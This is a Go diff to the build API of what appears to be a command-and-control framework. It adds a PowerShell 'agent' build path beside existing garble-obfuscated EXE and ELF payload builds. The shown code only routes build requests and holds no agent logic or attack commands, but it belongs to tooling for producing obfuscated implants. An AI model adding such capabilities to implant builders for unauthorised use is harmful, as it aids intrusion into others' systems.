@@ -1163,6 +1163,18 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// Pure PowerShell agent — no binary, no Go/Nim/C runtime
+	if cfg.Lang == "ps1" {
+		ps1Path, err := BuildPS1Agent(cfg, payloadsDir)
+		if err != nil {
+			jsonErr(w, "ps1 build: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		result["ps1"] = ps1Path
+		jsonOK(w, result)
+		return
+	}
+
 	if cfg.Lang == "c" && !isLoaderFmt {
 		if cfg.GOOS == "linux" {
 			elfPath, err := BuildCAgentLinux(cfg, payloadsDir)
@@ -2019,7 +2031,19 @@ func (s *Server) apiBuildStream(w http.ResponseWriter, r *http.Request, cfg Buil
 	payloadsDir := filepath.Join(projectRoot(), "bin", "payloads")
 	os.MkdirAll(payloadsDir, 0755)
 
-	// Only EXE streaming is supported (garble is Windows-EXE only)
+	// PS1 has its own build path — garble streaming doesn't apply to PS1
+	if cfg.Lang == "ps1" {
+		ps1Path, ps1Err := BuildPS1Agent(cfg, payloadsDir)
+		if ps1Err != nil {
+			sseJSON(map[string]any{"type": "error", "message": ps1Err.Error()})
+			return
+		}
+		s.recordArtifactMetadata(payloadsDir, map[string]string{"ps1": ps1Path}, cfg)
+		sseJSON(map[string]any{"type": "done", "result": map[string]string{"ps1": ps1Path}})
+		return
+	}
+
+	// EXE streaming with garble (Go/Nim/C/Rust Windows EXE)
 	exePath, err := BuildEXEStream(cfg, payloadsDir, pw)
 	if err != nil {
 		sseJSON(map[string]any{"type": "error", "message": err.Error()})
